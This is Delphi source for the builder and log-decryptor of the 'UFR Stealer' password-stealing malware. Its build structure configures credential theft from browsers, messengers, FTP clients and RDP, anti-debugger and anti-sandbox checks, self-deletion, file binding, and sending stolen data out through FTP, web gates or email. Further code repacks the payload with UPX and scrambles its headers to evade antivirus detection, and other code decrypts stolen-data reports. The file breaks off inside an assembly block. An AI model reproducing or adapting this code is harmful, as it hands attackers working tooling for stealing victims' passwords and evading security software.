unit Unit3;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, XPMan, jpeg, ComCtrls, Spin, Menus, RESOURCES, 
  ActnList, Buttons, IniFiles, winsock, ShellAPI, Registry, GFX_About,
  JoinForm, FlashUseForm, GateUseForm, FtpUseForm, Grids, VersionInfoEdit,
  DecryptorGeneracion, ImgList, Parser, EncdDecd, MailUseForm,
  Antis, Dloader, PwdProtectReportUseForm, sSkinProvider, sSkinManager,
  sPageControl, sSpeedButton, sGroupBox, sButton, sRichEdit, sTreeView, sEdit,
  sComboBox, sCheckBox, sLabel, sScrollBox, sPanel, sListBox, sDialogs,
  WideStrings, DB, SqlExpr;

  procedure RtlMoveMemory(var Dest; const Source; Count: LongWord);  stdcall; external kernel32 name 'RtlMoveMemory';
  function RtlDeCompressBuffer(CompressionFormatAndEngine:ULONG; DestinationBuffer: Pointer; DestinationBufferLength: ULONG; SourceBuffer: Pointer; SourceBufferLength: ULONG;
                             pDestinationSize: PULONG): Cardinal; stdcall; external 'ntdll.dll' name 'RtlDecompressBuffer';

const
  COMPRESSION_FORMAT_LZNT1        = $00000002;
  COMPRESSION_ENGINE_MAXIMUM      = $00000100;

type
  TForm3 = class(TForm)
    PageControl1: TsPageControl;
    TabSheet3: TsTabSheet;
    SaveDialog1: TSaveDialog;
    OpenDialog1: TOpenDialog;
    CheckBox7: TsCheckBox;
    CheckBox10: TsCheckBox;
    ComboBox4: TsComboBox;
    SaveDialog3: TSaveDialog;
    OpenDialog4: TOpenDialog;
    OpenDialog5: TOpenDialog;
    Button14: TsButton;
    CheckBox4: TsCheckBox;
    Edit1: TsEdit;
    Label1: TsLabel;
    CheckBox5: TsCheckBox;
    Button19: TsButton;
    TabSheet2: TsTabSheet;
    Button4: TsButton;
    Button16: TsButton;
    Button17: TsButton;
    TabSheet1: TsTabSheet;
    OpenDialog6: TOpenDialog;
    SaveDialog5: TSaveDialog;
    TreeView1: TsTreeView;
    CheckBox11: TsCheckBox;
    Image1: TImage;
    Label2: TsLabel;
    Image2: TImage;
    Label3: TsLabel;
    Label5: TsLabel;
    Image3: TImage;
    Image4: TImage;
    Label6: TsLabel;
    Label7: TsLabel;
    Image5: TImage;
    Image6: TImage;
    Label8: TsLabel;
    Label9: TsLabel;
    Image7: TImage;
    Image8: TImage;
    Label10: TsLabel;
    Label11: TsLabel;
    Image9: TImage;
    Image10: TImage;
    Label12: TsLabel;
    Label13: TsLabel;
    Image11: TImage;
    Label14: TsLabel;
    Image12: TImage;
    RichEdit1: TsRichEdit;
    Image13: TImage;
    Label15: TsLabel;
    Label18: TsLabel;
    Image14: TImage;
    Image15: TImage;
    Label4: TsLabel;
    Image16: TImage;
    Label19: TsLabel;
    Button3: TsButton;
    Label20: TsLabel;
    Image17: TImage;
    Button5: TsButton;
    Image19: TImage;
    Label22: TsLabel;
    Button6: TsButton;
    Image21: TImage;
    Label32: TsLabel;
    Button9: TsButton;
    Image22: TImage;
    Label33: TsLabel;
    SpeedButton1: TsSpeedButton;
    SpeedButton2: TsSpeedButton;
    SpeedButton3: TsSpeedButton;
    SpeedButton4: TsSpeedButton;
    SpeedButton5: TsSpeedButton;
    SpeedButton6: TsSpeedButton;
    GroupBox1: TsGroupBox;
    Label16: TsLabel;
    Image23: TImage;
    Image24: TImage;
    Label17: TsLabel;
    Label24: TsLabel;
    Image26: TImage;
    Image27: TImage;
    Label25: TsLabel;
    sSkinManager1: TsSkinManager;
    sSkinProvider1: TsSkinProvider;
    Image20: TImage;
    Image28: TImage;
    Image29: TImage;
    Image30: TImage;
    Image31: TImage;
    Image32: TImage;
    sLabel1: TsLabel;
    Image33: TImage;
    sEdit1: TsEdit;
    sCheckBox1: TsCheckBox;
    sLabel2: TsLabel;
    sCheckBox2: TsCheckBox;
    Image34: TImage;
    sLabel3: TsLabel;
    sLabel4: TsLabel;
    Image35: TImage;
    sScrollBox1: TsScrollBox;
    sLabel12: TsLabel;
    sLabel13: TsLabel;
    sLabel14: TsLabel;
    sLabel16: TsLabel;
    sLabel17: TsLabel;
    Image43: TImage;
    sLabel15: TsLabel;
    sLabel18: TsLabel;
    PopupMenu2: TPopupMenu;
    Undo1: TMenuItem;
    N1: TMenuItem;
    Cut1: TMenuItem;
    Copy1: TMenuItem;
    Paste1: TMenuItem;
    Delete1: TMenuItem;
    N2: TMenuItem;
    Selectall1: TMenuItem;
    Image44: TImage;
    sLabel19: TsLabel;
    sLabel20: TsLabel;
    Image45: TImage;
    sTabSheet1: TsTabSheet;
    sButton1: TsButton;
    sListBox1: TsListBox;
    sButton3: TsButton;
    sOpenDialog1: TsOpenDialog;
    sLabel21: TsLabel;
    sLabel22: TsLabel;
    sLabel23: TsLabel;
    sLabel24: TsLabel;
    sLabel25: TsLabel;
    sLabel26: TsLabel;
    Image46: TImage;
    sLabel27: TsLabel;
    googlesearch: TMenuItem;
    procedure sButton3Click(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
    procedure PopupMenu2Popup(Sender: TObject);
    procedure Selectall1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure sCheckBox2Click(Sender: TObject);
    procedure sEdit1Change(Sender: TObject);
    procedure sCheckBox1Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure SpeedButton6Click(Sender: TObject);
    procedure SpeedButton5Click(Sender: TObject);
    procedure SpeedButton4Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Edit1Change(Sender: TObject);
    procedure CheckBox5Click(Sender: TObject);
    procedure CheckBox11Click(Sender: TObject);
    procedure CheckBox10Click(Sender: TObject);
    procedure ComboBox4Change(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure TreeView1Change(Sender: TObject; Node: TTreeNode);
    procedure Button4Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure CheckBox4Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure CheckBox7Click(Sender: TObject);
    procedure ExtractRes(ResType, ResName, ResNewName : String);
    procedure UPX_Pack_and_Hack(filetopack:string);
    procedure SetVersionInfo(fn:string);
    procedure Struc2Build(ExeName:string;silent:boolean);
    procedure googlesearchClick(Sender: TObject);
  private
  public
    procedure SaveDecryptedTree(fn:string; tv:TTreeNodes; savetotype:byte);
    procedure ImagesWork;
    procedure VerInfoWork;
    procedure BuildStrucWork;
    procedure ParseCmdLineWork;
    procedure DecryptAndProcessResult;
    procedure GetAllFiles(mask: string);
    { Public declarations }
  protected
    procedure WMDropFiles (var Msg: TMessage); message wm_DropFiles;
  end;
type
  TNewHeader = record
    idReserved:WORD;
    idType:WORD;
    idCount:WORD;
  end;
  TResDirHeader = packed record
    bWidth:Byte;
    bHeight:Byte;
    bColorCount:Byte;
    bReserved:Byte;
    wPlanes:WORD;
    wBitCount:WORD;
    lBytesInRes:Longint;
  end;
  TIconFileResDirEntry = packed record
    DirHeader:TResDirHeader;
    lImageOffset:Longint;
  end;
  TIconResDirEntry = packed record
    DirHeader:TResDirHeader;
    wNameOrdinal:WORD;
  end;
  PIconResDirGrp = ^TIconResDirGrp;
  TIconResDirGrp = packed record
    idHeader:TNewHeader;
    idEntries:array[0..0] of TIconResDirEntry;
  end;
  PIconFileResGrp = ^TIconFileResDirGrp;
  TIconFileResDirGrp = packed record
    idHeader:TNewHeader;
    idEntries:array[0..0] of TIconFileResDirEntry;
  end;
type
  BUILD_STRUC = packed record
    steal_pwd:ansistring; // priv8
    steal_key_string:ansistring;  // publ
    sleep:dword;
    sleep_enabled:boolean;
    dropto_victim:boolean;
    dropto_victim_index:dword;
    selfdel:boolean;
    adminmanifest:boolean;
    grab_external_ip:boolean;
    use_upx:boolean;
    write_overlay:boolean;
    write_overlay_size:dword;
    bind:boolean;
    bind_run_files_before_after:byte;
    bind_fc:dword;
    bind_files:array of string; // setlen!
    dload_fc:dword;
    dload_files:array of string; // setlen!
    anti_fc:dword;
    anti_exes:array of string; // setlen!
    anti_dbg:byte;
    anti_vbox:byte;
    anti_ws:byte;
    anti_vm:byte;
    anti_anubis:byte;
    anti_sbie:byte;
    anti_procexp:byte;
    anti_procmon:byte;
    anti_filemon:byte;
    anti_regmon:byte;
    use_masking:boolean;
    masking_file:string;
    change_icon:boolean;
    change_icon_file:string;
    set_vi:boolean;
    set_vi_strings:array[1..7] of string;
    copy_to_folder:boolean;
    copy_to_folder_name:string;
    hide_files_folder:boolean;
    use_ftp:boolean;
    ftp_host:string;
    ftp_login:string;
    ftp_pwd:string;
    ftp_pm:boolean;
    ftp_tofolder:boolean;
    ftp_tofolder_name:string;
    use_gate:boolean;
    gate1:string;
    gate2:string;
    use_mail:boolean;
    mail_from:string;
    mail_to:string;
    mail_login:string;
    mail_pwd:string;
    mail_server:string;
    mail_port:word;
  end;


const
  RSA512_PUBLIC_HEADER : array [$01..$14] of byte = ($06,$02,$00,$00,$00,$A4,$00,$00,$52,$53,$41,$31,$00,$02,$00,$00,$01,$00,$01,$00);
  RSA512_PRIVATE_HEADER: array [$01..$14] of byte = ($07,$02,$00,$00,$00,$A4,$00,$00,$52,$53,$41,$32,$00,$02,$00,$00,$01,$00,$01,$00);

  manifadm = '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>'+#13#10+
             '<requestedExecutionLevel level="requireAdministrator"></requestedExecutionLevel>'+#13#10+
             '</requestedPrivileges></security></trustInfo></assembly>';

  manifusr = '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>'+#13#10+
             '<requestedExecutionLevel level="asInvoker"></requestedExecutionLevel>'+#13#10+
             '</requestedPrivileges></security></trustInfo></assembly>';

const
  err1c= '������ !';
  err4t= '������ ������ !';
  err6t= '�����-�� ���� �� ��������� !';
  err7t= '����������� ������� ������ ��� �������� !';
  err10t='���� � ������ ����� �� ��������� !';
  err11t='���� � �������� �� �������� ��� ���� ������ ���������. �������� ��� ������ � ������� ������.';
  err12t='�� ������ ����� �������� �������!';
  g1t  = '��������� ������ !';
  in_c = 'Info';

  m11  = '������ ������ ���������� �� ������ �������. ���������� ��������� ����������.';
  m12  = '����������� ����� ������ �� ���������, ��������� ����� ����� �����. ����������� ��������� ����������.';
  m13  = '������������ ������!';
  m14  = '������ ����� ��������� ������ ������� 0-9 � A-F!';
  m15  = '���� �� �������� ������� UFR!';

  PROV_RSA_AES   = $00000018;

  PARSER_TO_TXT              = $00000001;
  PARSER_TO_HTML             = $00000002;
  PARSER_TO_TXTCOLLECTABLE   = $00000003;

  RT_MANIFEST                = 24;

  max_arrays_count = 256; // For build structure!

var
  Form3: TForm3;
  headerdump:string;
  f:file of byte;
  txtcollfn,s,s2,s3:string;
  hstd,ret_val:dword;
  bs:BUILD_STRUC;
  newimlist:TImageList;
  ufr_dword:dword;
  ufr_ver,pidgin,ie,fxp,fz,live,wtc,opera,gtalk,infium,miranda,mra,icq,
  farfar,thebat,ff,smartftp,msn,chrome,q2005,safari,psi,wot,coreftp,wsftp,ras,
  thunderbird,im,seamonkey,users,soft,processes,disks,sysinfo,sysinfoabout,
  rdp,Folders,icq8,pokerstars,futp,scp:string;

implementation

{$R *.dfm}

function GetFS(FileName: String): integer;
var
  FS: TFileStream;
begin
  Result:=0;
  FS:=nil;
  try
    FS := TFileStream.Create(Filename, fmOpenRead);
  except
    Result := -1;
  end;
  if Result <> -1 then Result := FS.Size;
  FS.Free;
end;

procedure TForm3.ExtractRes(ResType, ResName, ResNewName : String);
var
  Res : TResourceStream;
begin
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
end;

function UpdateResources(hModule: HMODULE; lptype, lpname: PChar; str: dword): dword; stdcall;
var
  hRes,hResLoaded:cardinal;
  pData:pointer;
  nSizeOfRes:dword;
begin
	hRes := FindResource(hModule,lpName,lpType);
	hResLoaded := LoadResource(hModule,hRes);
	pData := LockResource(hResLoaded);
	nSizeOfRes := SizeofResource(hModule,hRes);
	UpdateResource(str,lpType,lpName,GLOBAL_LANG,pData,nSizeOfRes);
	UnlockResource(hResLoaded);
	FreeResource(hResLoaded);
	result:=1;
end;

procedure SetAppIcon(FileName,IconFile,ResName:string);
var I,FileGrpSize,IconGrpSize:Integer; Group:Pointer; Header:TNewHeader; FileGrp:PIconFileResGrp;
IconGrp:PIconResDirGrp; Icon:TIcon; Stream:TMemoryStream; hUpdateRes:THandle;
begin
 hUpdateRes:=BeginUpdateResource(PChar(FileName), False);
 Icon:=TIcon.Create;
 Icon.LoadFromFile(IconFile);
 Stream:=TMemoryStream.Create;
  try
   Icon.SaveToStream(Stream);
  finally
   Icon.Free;
  end;
 Stream.Position:=0;
 Stream.Read(Header, SizeOf(Header));
 FileGrpSize := SizeOf(TIconFileResDirGrp) + (Header.idCount - 1) * SizeOf(TIconFileResDirEntry);
 IconGrpSize := SizeOf(TIconResDirGrp) + (Header.idCount - 1) * SizeOf(TIconResDirEntry);
 GetMem(FileGrp, FileGrpSize);
 GetMem(IconGrp, IconGrpSize);
 Stream.Position:=0;
 Stream.Read(FileGrp^, FileGrpSize);
 Group:=nil;
  try
   for I:=0 to FileGrp^.idHeader.idCount - 1 do
    begin
     with IconGrp^ do
      begin
       idHeader:=FileGrp^.idHeader;
       idEntries[i].DirHeader:=FileGrp^.idEntries[i].DirHeader;
       idEntries[i].wNameOrdinal:=I;
      end;
      with FileGrp^.idEntries[i] do
      begin
       Stream.Seek(lImageOffset, soFromBeginning);
       ReallocMem(Group, DirHeader.lBytesInRes);
       Stream.Read(Group^, DirHeader.lBytesInRes);
       UpdateResource(hUpdateRes,RT_ICON,PChar(MakeIntResource(I)), 0, Group, DirHeader.lBytesInRes);
      end;
    end;
  UpdateResource(hUpdateRes,RT_GROUP_ICON, PChar(ResName), 0, IconGrp, IconGrpSize);
  EndUpdateResource(hUpdateRes, False);
   finally
    Stream.Free;
    FreeMem(FileGrp);
    FreeMem(IconGrp);
    FreeMem(Group);
   end;
end;

function Replace(Str, X, Y: string): string;
var
  buf1, buf2, buffer: string;
begin
  buf1 := '';
  buf2 := Str;
  Buffer := Str;
  while Pos(X, buf2) > 0 do
  begin
    buf2 := Copy(buf2, Pos(X, buf2), (Length(buf2) - Pos(X, buf2)) + 1);
    buf1 := Copy(Buffer, 1, Length(Buffer) - Length(buf2)) + Y;
    Delete(buf2, Pos(X, buf2), Length(X));
    Buffer := buf1 + buf2;
  end;
  Replace := Buffer;
end;

procedure TForm3.DecryptAndProcessResult;
label
  tryagain2parse,
  parse_exit;
var
  outstr:string;
begin
tryagain2parse:
  if parser.IsReportPwdProtected(opendialog6.FileName) then
  begin
    if not parser.GetPwd then
      goto parse_exit;
  end;
  ret_val:=Parser.DecryptReport(opendialog6.FileName);
  case ret_val of
    1: begin
         // wrong ver
         // CryptAcquireContext fail
         // CryptImportKey fail
         // CryptDecrypt fail
         outstr:=m11;
         if headerdump<>'' then outstr:=outstr+#13#10#13#10+'���� ������:'#13#10+headerdump;
         MessageBox(application.Handle, pchar(outstr), pchar(err1c), MB_ICONERROR);
         goto parse_exit;
       end;
    2: begin
         // incorrect crc
         MessageBox(application.Handle, pchar(m12), pchar(err1c), MB_ICONERROR);
         goto parse_exit;
       end;
    3: begin
         // Wrong format
         // CryptImportKey fail
         // CryptDecrypt fail
         // CryptImportKey fail
         // CryptDecrypt fail
         MessageBox(application.Handle, pchar(m13), pchar(err1c), MB_ICONERROR);
         parser.ClearSavedPwd;
         goto tryagain2parse;
       end;
    4: begin
         // No mark - it's not ufr report
         MessageBox(application.Handle, pchar(m15), pchar(err1c), MB_ICONERROR);
         goto parse_exit;
       end;

  end;
  pagecontrol1.ActivePage:=TabSheet1;
  Form3.Caption:='UFR Stealer v'+ufr_ver+' - '+extractfilename(opendialog6.FileName);
  savedialog5.filename:=changefileext(opendialog6.FileName,'');
parse_exit:
  richedit1.Clear;
  exit;
end;

// Save parsed data from TreeView
procedure TForm3.SaveDecryptedTree(fn:string; tv:TTreeNodes; savetotype:byte);
var
  hFile: dword;
  i,i2,i3:integer;
  nw:dword;
  crlfU:dword;
  w:word;
  tmps,tmps2,replaceto:string;
  BOM:word;
  t:tstringlist;
const
  htmlhead1 = '<html><head><title>UFR Stealer - ';
  htmlhead2 = '</title><style type="text/css"> body {background-color: #1A1A1A; font-family: Consolas; } #d {color:#9D9D9D;font-size:80%;} #b {color:#6060FF;font-weight:bold;font-size:80%;} #r {color:#FF6060;font-weight:bold;font-size:80%;}'+
              '#g {color:#60FF60;font-weight:bold;font-size:80%;} h1,h2 {color:#9D9D9D;font-weight:normal;}</style></head><body><blockquote><h1>UFR Stealer - ';
  htmlhead3 = '</h1>';
  htmlfoot1 = '</blockquote></body></html>';
begin
  crlfU := $000A000D;
  BOM := $FEFF;

  case savetotype of
    PARSER_TO_TXT:
      fn:=changefileext(fn,'.txt');
    PARSER_TO_TXTCOLLECTABLE:
      begin
        if txtcollfn='' then txtcollfn:=ExtractFileName(fn);
        fn:=changefileext(ExtractFilePath(fn)+txtcollfn,'.txt');
      end;  
    PARSER_TO_HTML:
      fn:=changefileext(fn,'.html');
  end;
  hFile:=CreateFile(pchar(fn),
                     GENERIC_READ or GENERIC_WRITE,
                     FILE_SHARE_READ or FILE_SHARE_WRITE,
                     nil, OPEN_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, 0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  SetFilePointer(hFile,0,nil,FILE_END);
  WriteFile(hFile, BOM, sizeof(BOM), nw, nil);
  // TXT
  if ((savetotype = PARSER_TO_TXT) or
      (savetotype = PARSER_TO_TXTCOLLECTABLE)) then
  begin
      // Text
      for i:=0 to tv.Count-1 do
      begin
        s:=tv[i].Text;
        for i2:=1 to length(s) do
          begin
            w:=ord(s[i2]);
            WriteFile(hFile, w, sizeof(w), nw, nil);
          end;
        WriteFile(hFile, crlfU, sizeof(crlfU), nw, nil);
        s:=string(tv[i].Data);
        for i2:=1 to length(s) do
          begin
            w:=ord(s[i2]);
            WriteFile(hFile, w, sizeof(w), nw, nil);
          end;
        WriteFile(hFile, crlfU, sizeof(crlfU), nw, nil);
      end;
  end;

  // HTML
  if savetotype = PARSER_TO_HTML then
  begin
    t:=TStringList.create;
    // headers
    tmps:=extractfilename(changefileext(fn,''));
    for i3:=1 to length(htmlhead1) do
    begin
      w:=ord(htmlhead1[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    for i3:=1 to length(tmps) do
    begin
      w:=ord(tmps[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    for i3:=1 to length(htmlhead2) do
    begin
      w:=ord(htmlhead2[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    for i3:=1 to length(tmps) do
    begin
      w:=ord(tmps[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    for i3:=1 to length(htmlhead3) do
    begin
      w:=ord(htmlhead3[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    // items
    for i:=0 to tv.Count-1 do
    begin
      // Soft name or sysinfo type
      s:='<h2>'+tv[i].Text+'</h2><table>';
      for i2:=1 to length(s) do
        begin
          w:=ord(s[i2]);
          WriteFile(hFile, w, sizeof(w), nw, nil);
        end;
      // main data
      t.Clear;
      t.text:=string(tv[i].Data);
      s:='';
      for i3:=0 to t.Count-1 do
      begin
        tmps:=t[i3];
        if tmps<>'' then
        begin
          for i2:=1 to length(TYPES) do
          begin
            if i2 in [1,5,6,12] then
              replaceto:='<tr><td id="b">'+TYPES[i2]+':</td><td id="d">'
            else if i2 in [2,7,8,9,10,11] then
              replaceto:='<tr><td id="g">'+TYPES[i2]+':</td><td id="d">'
            else if i2 in [3,4] then
              replaceto:='<tr><td id="r">'+TYPES[i2]+':</td><td id="d">';
            tmps2:=Replace(tmps,TYPES[i2]+':',replaceto);
            if length(tmps2)<>length(tmps) then break;
          end;
        end;
        if length(tmps2)<>length(tmps) then
        begin
          if tmps<>'' then
            tmps:=tmps2+'</td></tr>';
        end
        else
          tmps:='<tr><td id="d">'+tmps2+'</td></tr>';
        s:=s+tmps;
      end;
      s:=s+'</table>';
      for i2:=1 to length(s) do
        begin
          w:=ord(s[i2]);
          WriteFile(hFile, w, sizeof(w), nw, nil);
        end;
    end;
    // footer
    for i3:=1 to length(htmlfoot1) do
    begin
      w:=ord(htmlfoot1[i3]);
      WriteFile(hFile, w, sizeof(w), nw, nil);
    end;
    t.free;
  end;
  CloseHandle(hFile);
end;

function ExecAndWait(const FileName,
                     Params: String;
                     const WinState: Word): boolean; export;
var
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation; 
  CmdLine: String;
begin
  CmdLine := '"' + Filename + '" ' + Params;
  FillChar(StartInfo, SizeOf(StartInfo), #0);
  with StartInfo do
  begin
    cb := SizeOf(StartInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := WinState;
  end;
  Result := CreateProcess(nil, PChar( String( CmdLine ) ), nil, nil, false,
                          CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, nil,
                          PChar(ExtractFilePath(Filename)),StartInfo,ProcInfo);
  if Result then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread); 
  end; 
end;

procedure TForm3.UPX_Pack_and_Hack(filetopack:string);
label
  bullshit,done;
var
  TmpDir: PChar;
  tmp,td,pfr:string;
  fs,hFile,hMap,hMapFile,i,i2:dword;
  idh : PImageDosHeader;
  ifh : PImageFileHeader;
  ioh : PImageOptionalHeader;
  ish : PSectionsArray;
begin
  TmpDir := StrAlloc(MAX_PATH);
  GetTempPath(MAX_PATH, TmpDir);
  tmp := string(TmpDir);
  if tmp[Length(tmp)] <> '\' then tmp := tmp + '\';
  td:=tmp;
  pfr:=tmp+'packed_ufr.exe';
  StrDispose(TmpDir);
  tmp:=tmp+'upx.exe';
  ExtractRes('upx', 'upx', tmp);
  ExecAndWait(tmp, '-9 -opacked_ufr.exe "'+filetopack+'"', SW_HIDE);

// ==========================================================================
// scramble it!
       hFile:=CreateFile(pchar(pfr), GENERIC_READ or GENERIC_WRITE,
                                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil, OPEN_EXISTING,
                                      FILE_ATTRIBUTE_HIDDEN, 0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  fs:=GetFileSize(hFile,nil);
  if fs=INVALID_FILE_SIZE then exit;
  hMap:=CreateFileMapping(hFile, nil, PAGE_READWRITE, 0, fs, nil);
  if hMap=0 then exit;
  hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
  if hMapFile=0 then exit;

  idh := PImageDosHeader (hMapFile);
  ifh := PImageFileHeader (hMapFile + dword(idh._lfanew) + 4);
  ioh := PImageOptionalHeader (cardinal(ifh) + IMAGE_SIZEOF_FILE_HEADER);
  ish := PSectionsArray (cardinal(ioh) + IMAGE_SIZEOF_NT_OPTIONAL_HEADER);

// RENAME ALL SECTIONS' NAME
  randomize;
  for i := 0 to ifh.NumberOfSections-1 do
  begin
    if (ish[i].Name[0]=ord('.')) and
       (ish[i].Name[1]=ord('r')) and
       (ish[i].Name[2]=ord('s')) and
       (ish[i].Name[3]=ord('r')) and
       (ish[i].Name[4]=ord('c')) then
    else
      begin
        for i2:=0 to 7 do
        ish[i].Name[i2]:=random(256);
      end;
  end;

  asm
    pushad
    mov edi, dword ptr [hMapFile]
    add edi, $1F0
    mov eax, dword ptr [edi]
    cmp eax, $38302E33 // '3.08'
    jne bullshit
    mov ecx, $25
    xor eax, eax
    rep stosb
    jmp done
    bullshit:
    xor eax, eax
    mov [eax],eax
    done:
    popad
  end;

  UnmapViewOfFile(pointer(hMapFile));
  CloseHandle(hMap);
  CloseHandle(hFile);
// ==========================================================================

  CopyFile(pchar(pfr),pchar(filetopack),FALSE);
  DeleteFile(pchar(tmp));
  DeleteFile(pchar(pfr));
end;

procedure TForm3.SetVersionInfo(fn:string);
label
  cpy_e1, cpy_e2, cpy_e3, cpy_e4, cpy_e5,
  try_align_1, aligned_4_1, try_align_2, aligned_4_2,
  try_align_3, aligned_4_3, try_align_4, aligned_4_4,
  try_align_5, aligned_4_5;

const
  h1 : array[1..$28] of byte = (
  $F0,$01,$34,$00,$00,$00,$56,$00,$53,$00,$5F,$00,$56,$00,$45,$00,
  $52,$00,$53,$00,$49,$00,$4F,$00,$4E,$00,$5F,$00,$49,$00,$4E,$00,
  $46,$00,$4F,$00,$00,$00,$00,$00);
  //FIXEDFILEINFO
  h2 : array[1..$34] of byte = (
  $BD,$04,$EF,$FE,$00,$00,$01,$00,$05,$00,$04,$00,$00,$00,$05,$00,
  $05,$00,$04,$00,$00,$00,$05,$00,$00,$00,$00,$00,$00,$00,$00,$00,
  $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
  $00,$00,$00,$00);
  h3 : array[1..$24] of byte = (
  $4E,$01,$00,$00,$00,$00,$53,$00,$74,$00,$72,$00,$69,$00,$6E,$00,
  $67,$00,$46,$00,$69,$00,$6C,$00,$65,$00,$49,$00,$6E,$00,$66,$00,
  $6F,$00,$00,$00);
  h4 : array[1..$18] of byte = (
  $2A,$01,$00,$00,$00,$00,$30,$00,$34,$00,$31,$00,$39,$00,$30,$00,
  $34,$00,$45,$00,$34,$00,$00,$00);
  filedesc : array[1..$28] of byte = (
  $3E,$00,$0B,$00,$01,$00,$46,$00,$69,$00,$6C,$00,$65,$00,$44,$00,
  $65,$00,$73,$00,$63,$00,$72,$00,$69,$00,$70,$00,$74,$00,$69,$00,
  $6F,$00,$6E,$00,$00,$00,$00,$00);
  filever : array[1..$20] of byte = (
  $30,$00,$08,$00,$01,$00,$46,$00,$69,$00,$6C,$00,$65,$00,$56,$00,
  $65,$00,$72,$00,$73,$00,$69,$00,$6F,$00,$6E,$00,$00,$00,$00,$00);
  filever2 : array[1..$24] of byte = (
  $34,$00,$08,$00,$01,$00,$50,$00,$72,$00,$6F,$00,$64,$00,$75,$00,
  $63,$00,$74,$00,$56,$00,$65,$00,$72,$00,$73,$00,$69,$00,$6F,$00,
  $6E,$00,$00,$00);
  prodname : array[1..$20] of byte = (
  $32,$00,$09,$00,$01,$00,$50,$00,$72,$00,$6F,$00,$64,$00,$75,$00,
  $63,$00,$74,$00,$4E,$00,$61,$00,$6D,$00,$65,$00,$00,$00,$00,$00);
  compname : array[1..$20] of byte = (
  $3A,$00,$0D,$00,$01,$00,$43,$00,$6F,$00,$6D,$00,$70,$00,$61,$00,
  $6E,$00,$79,$00,$4E,$00,$61,$00,$6D,$00,$65,$00,$00,$00,$00,$00);
  endh : array[1..$44] of byte = (
  $44,$00,$00,$00,$00,$00,$56,$00,$61,$00,$72,$00,$46,$00,$69,$00,
  $6C,$00,$65,$00,$49,$00,$6E,$00,$66,$00,$6F,$00,$00,$00,$00,$00,
  $24,$00,$04,$00,$00,$00,$54,$00,$72,$00,$61,$00,$6E,$00,$73,$00,
  $6C,$00,$61,$00,$74,$00,$69,$00,$6F,$00,$6E,$00,$00,$00,$00,$00,
  $19,$04,$E4,$04);

var
  hmem,p:dword;
  v1,v2,v3,v4:word;
  s1,s2,s3,verstr:widestring;
  l1,l2,l3,l4:dword;
begin
  v1:=strtoint(bs.set_vi_strings[4]);
  v2:=strtoint(bs.set_vi_strings[5]);
  v3:=strtoint(bs.set_vi_strings[6]);
  v4:=strtoint(bs.set_vi_strings[7]);

  l1:=length(bs.set_vi_strings[1]);
  l2:=length(bs.set_vi_strings[2]);
  l3:=length(bs.set_vi_strings[3]);
  l4:=length(bs.set_vi_strings[4]+'.'+
             bs.set_vi_strings[5]+'.'+
             bs.set_vi_strings[6]+'.'+
             bs.set_vi_strings[7]);

  s1:=bs.set_vi_strings[1];
  s2:=bs.set_vi_strings[2];
  s3:=bs.set_vi_strings[3];
  verstr:=bs.set_vi_strings[4]+'.'+
                             bs.set_vi_strings[5]+'.'+
                             bs.set_vi_strings[6]+'.'+
                             bs.set_vi_strings[7];

  asm
    push PAGE_READWRITE
    push MEM_COMMIT or MEM_RESERVE
    push 1024*1024
    push 0
    call VirtualAlloc
    mov  dword ptr [hMem], eax
    mov  dword ptr [p], eax

    mov  ecx, $28
    mov  esi, offset h1
    mov  edi, dword ptr [p]
    rep  movsb
    add  dword ptr [p], $28

    mov  ecx, $34
    mov  esi, offset h2
    mov  edi, dword ptr [p]
    rep  movsb
    mov  edi, dword ptr [p]
    mov  ax, word ptr [v2]
    mov  word ptr [edi+$08],ax
    mov  ax, word ptr [v1]
    mov  word ptr [edi+$0a],ax
    mov  ax, word ptr [v4]
    mov  word ptr [edi+$0c],ax
    mov  ax, word ptr [v3]
    mov  word ptr [edi+$0e],ax
    mov  ax, word ptr [v2]
    mov  word ptr [edi+$10],ax
    mov  ax, word ptr [v1]
    mov  word ptr [edi+$12],ax
    mov  ax, word ptr [v4]
    mov  word ptr [edi+$14],ax
    mov  ax, word ptr [v3]
    mov  word ptr [edi+$16],ax
    add  dword ptr [p], $34

    mov  ecx, $24
    mov  esi, offset h3
    mov  edi, dword ptr [p]
    rep  movsb
